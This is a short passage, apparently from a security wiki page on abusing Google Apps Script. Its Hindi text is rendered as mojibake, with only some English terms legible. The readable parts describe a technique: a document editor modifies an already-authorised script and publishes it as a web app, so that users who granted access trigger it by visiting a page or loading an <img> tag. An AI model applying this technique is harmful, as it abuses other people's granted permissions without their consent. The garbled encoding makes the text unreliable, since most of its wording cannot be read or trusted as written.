рдпрд╣ рднреА рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрджрд┐ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ App Script рдореМрдЬреВрдж рд╣реИ** рдФрд░ рд▓реЛрдЧреЛрдВ рдиреЗ **рдПрдХреНрд╕реЗрд╕ рджрд┐рдпрд╛ рд╣реИ**, рддреЛ рдЬреЛ рднреА рдбреЙрдХ рдкрд░ **рд╕рдВрдкрд╛рджрдХ** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓рд╛ рд╣реИ рд╡рд╣ рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдПрдХреНрд╕реЗрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред**\
рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд▓реЛрдЧреЛрдВ рдХреЛ App Script рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдФрд░ рдПрдХ рдЕрдЪреНрдЫреА рдЯреНрд░рд┐рдХ рдпрд╣ рд╣реИ рдХрд┐ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХ рд╡реЗрдм рдРрдк рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ**ред рдЬрдм **рд▓реЛрдЧ** рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рдПрдХреНрд╕реЗрд╕ рджрд┐рдпрд╛ рд╣реИ** рдЙрдиреНрд╣реЗрдВ рд╡реЗрдм рдкреЗрдЬ рддрдХ рдкрд╣реБрдВрдЪрддреЗ рд╣реИрдВ, рддреЛ рд╡реЗ **App Script рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗ** (рдпрд╣ `<img>` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ)ред
{% endhint %}
